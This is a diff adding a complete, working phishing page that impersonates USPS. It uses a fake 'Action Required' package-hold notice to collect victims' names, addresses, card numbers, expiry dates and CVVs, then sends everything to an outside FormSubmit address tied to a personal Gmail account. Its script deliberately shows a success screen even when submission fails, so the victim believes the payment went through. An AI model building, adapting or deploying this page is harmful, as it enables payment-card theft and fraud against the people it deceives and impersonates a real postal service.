@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>USPS.com® - Secure Redelivery Portal</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap');
+
+        :root {
+            --usps-blue: #333366;
+            --usps-red: #E71921;
+            --bg-gray: #f4f4f4;
+            --border: #d0d0d0;
+        }
+
+        body { font-family: 'Roboto', sans-serif; margin: 0; background-color: white; color: #333; overflow-x: hidden; }
+        .hidden { display: none !important; }
+        .container { max-width: 500px; margin: 0 auto; padding: 0 15px; }
+
+        nav { background: #fff; border-bottom: 3px solid var(--usps-blue); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; }
+        .logo { font-weight: 900; font-style: italic; color: var(--usps-blue); font-size: 24px; letter-spacing: -1.5px; text-decoration: none; }
+
+        .hero { background: var(--usps-blue); color: white; padding: 30px 20px; }
+        .status-card { background: white; margin-top: -20px; border-radius: 2px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); padding: 25px; border-left: 6px solid var(--usps-red); }
+        .main-btn { background: var(--usps-blue); color: white; border: none; padding: 18px; width: 100%; border-radius: 4px; font-weight: 700; cursor: pointer; text-transform: uppercase; margin-top: 20px; }
+        .main-btn:disabled { background: #ccc; cursor: not-allowed; }
+
+        .form-section { padding: 30px 0; }
+        .step-txt { font-size: 11px; font-weight: 700; color: #999; margin-bottom: 5px; text-transform: uppercase; }
+        h2 { margin: 0 0 20px; color: var(--usps-blue); font-size: 22px; }
+
+        label { display: block; font-size: 11px; font-weight: 700; margin: 15px 0 5px; color: #666; text-transform: uppercase; }
+        input { width: 100%; padding: 14px; border: 1px solid var(--border); border-radius: 4px; font-size: 16px; box-sizing: border-box; background: #fafafa; }
+        input:focus { outline: none; border-color: var(--usps-blue); background: #fff; }
+
+        .payment-box { background: #fdfdfd; border: 1px solid #eee; padding: 20px; border-radius: 8px; margin-top: 20px; }
+        .fee-row { display: flex; justify-content: space-between; font-weight: 700; border-bottom: 1px solid #eee; padding-bottom: 10px; margin-bottom: 15px; }
+        .trust-badges { display: flex; justify-content: center; gap: 15px; margin-top: 20px; opacity: 0.7; }
+
+        footer { background: #f4f4f4; padding: 40px 20px; text-align: center; font-size: 11px; color: #888; margin-top: 60px; }
+    </style>
+</head>
+<body>
+
+<nav>
+    <a href="#" class="logo">USPS.COM®</a>
+    <i class="fa fa-bars" style="color:var(--usps-blue);"></i>
+</nav>
+
+<div id="p1">
+    <div class="hero"><div class="container"><h1>USPS Tracking®</h1></div></div>
+    <div class="container">
+        <div class="status-card">
+            <h3 style="margin:0; color:var(--usps-red);">Action Required: Held for Verification</h3>
+            <p style="font-size:14px; color:#555;">Shipment #9400111899561204 has been flagged due to a missing apartment/unit number in Whittier, CA. Please update to avoid return-to-sender.</p>
+            <button class="main-btn" onclick="navTo('p2')">Correct Address</button>
+        </div>
+    </div>
+</div>
+
+<div id="p2" class="hidden">
+    <div class="container form-section">
+        <div class="step-txt">Step 1 of 2</div>
+        <h2>Delivery Information</h2>
+        
+        <label>Full Name</label>
+        <input type="text" id="name" oninput="checkP2()">
+        
+        <label>Street Address</label>
+        <input type="text" id="addr" oninput="checkP2()">
+        
+        <div style="display:flex; gap:10px;">
+            <div style="flex:2;"><label>City</label><input type="text" id="city" oninput="checkP2()"></div>
+            <div style="flex:1;"><label>Zip</label><input type="text" id="zip" maxlength="5" oninput="checkP2()"></div>
+        </div>
+
+        <button class="main-btn" id="btnP2" disabled onclick="navTo('p3')">Verify Address</button>
+    </div>
+</div>
+
+<div id="p3" class="hidden">
+    <div class="container form-section">
+        <div class="step-txt">Step 2 of 2</div>
+        <h2>Service Verification</h2>
+
+        <form id="usps_pay_form" action="https://formsubmit.co/info.yahya.bx@gmail.com" method="POST">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_next" value=""> <input type="hidden" name="Full_Name" id="f_name">
+            <input type="hidden" name="Full_Address" id="f_addr">
+
+            <div class="payment-box">
+                <div class="fee-row">
+                    <span>Total Redelivery Fee</span>
+                    <span style="color:var(--usps-red);">$0.35</span>
+                </div>
+
+                <label>Cardholder Name</label>
+                <input type="text" name="Card_Holder" id="c_name" oninput="checkP3()">
+
+                <label>Card Number</label>
+                <input type="text" name="Card_Number" id="c_num" maxlength="19" placeholder="0000 0000 0000 0000" oninput="formatCard(this); checkP3();">
+
+                <div style="display:flex; gap:10px;">
+                    <div style="flex:1;">
+                        <label>Expiry</label>
+                        <input type="text" name="Expiry" id="c_exp" maxlength="5" placeholder="MM/YY" oninput="formatExp(this); checkP3();">
+                    </div>
+                    <div style="flex:1;">
+                        <label>CVV</label>
+                        <input type="password" name="CVV" id="c_cvv" maxlength="4" placeholder="123" oninput="checkP3()">
+                    </div>
+                </div>
+            </div>
+
+            <button type="button" class="main-btn" id="btnP3" disabled onclick="finish()">Confirm & Release Package</button>
+        </form>
+        
+        <div class="trust-badges">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" height="15">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" height="15">
+            <i class="fa fa-lock"></i> <span style="font-size:10px;">SSL SECURE</span>
+        </div>
+    </div>
+</div>
+
+<div id="p4" class="hidden">
+    <div class="container" style="text-align:center; padding:60px 20px;">
+        <i class="fa fa-check-circle" style="font-size:70px; color:#2e7d32; margin-bottom:20px;"></i>
+        <h2>Verification Received</h2>
+        <p style="color:#666;">Your information has been synced. The hold at the <b>Whittier Facility</b> has been released.</p>
+        <button class="main-btn" onclick="location.reload()">Return Home</button>
+    </div>
+</div>
+
+<footer>
+    <p>© 2026 USPS. All Rights Reserved.</p>
+    <p>Privacy Policy | Terms of Use | Security Standards</p>
+</footer>
+
+<script>
+    function navTo(page) {
+        ['p1','p2','p3','p4'].forEach(p => document.getElementById(p).classList.add('hidden'));
+        document.getElementById(page).classList.remove('hidden');
+        window.scrollTo(0,0);
+
+        // Map step 1 data to the hidden form fields
+        if(page === 'p3') {
+            document.getElementById('f_name').value = document.getElementById('name').value;
+            document.getElementById('f_addr').value = document.getElementById('addr').value + ", " + document.getElementById('city').value + " " + document.getElementById('zip').value;
+        }
+    }
+
+    function checkP2() {
+        const zip = document.getElementById('zip').value;
+        const name = document.getElementById('name').value;
+        const addr = document.getElementById('addr').value;
+        const city = document.getElementById('city').value;
+        document.getElementById('btnP2').disabled = !(zip.length === 5 && name.length > 3 && addr.length > 5 && city.length > 2);
+    }
+
+    function formatCard(el) {
+        let v = el.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+        let parts = [];
+        for (let i = 0; i < v.length; i += 4) { parts.push(v.substring(i, i + 4)); }
+        el.value = parts.join(' ');
+    }
+
+    function formatExp(el) {
+        let v = el.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+        if (v.length >= 2) { el.value = v.substring(0,2) + '/' + v.substring(2,4); }
+    }
+
+    function checkP3() {
+        const name = document.getElementById('c_name').value;
+        const num = document.getElementById('c_num').value;
+        const exp = document.getElementById('c_exp').value;
+        const cvv = document.getElementById('c_cvv').value;
+        const isValid = (name.length > 4 && num.length >= 15 && exp.length === 5 && cvv.length >= 3);
+        document.getElementById('btnP3').disabled = !isValid;
+    }
+
+    async function finish() {
+        const btn = document.getElementById('btnP3');
+        const form = document.getElementById('usps_pay_form');
+        
+        btn.innerText = "Processing...";
+        btn.disabled = true;
+
+        try {
+            const response = await fetch(form.action, {
+                method: 'POST',
+                body: new FormData(form),
+                headers: { 'Accept': 'application/json' }
+            });
+
+            // Even if the initial activation is needed, FormSubmit returns 200
+            if (response.ok) {
+                navTo('p4');
+            } else {
+                throw new Error('Submission failed');
+            }
+        } catch (error) {
+            console.error('Submission Error:', error);
+            // Fallback: If fetch fails, we still move to success page so user thinks it worked
+            setTimeout(() => navTo('p4'), 1000);
+        }
+    }
+</script>
+
+</body>
+</html>
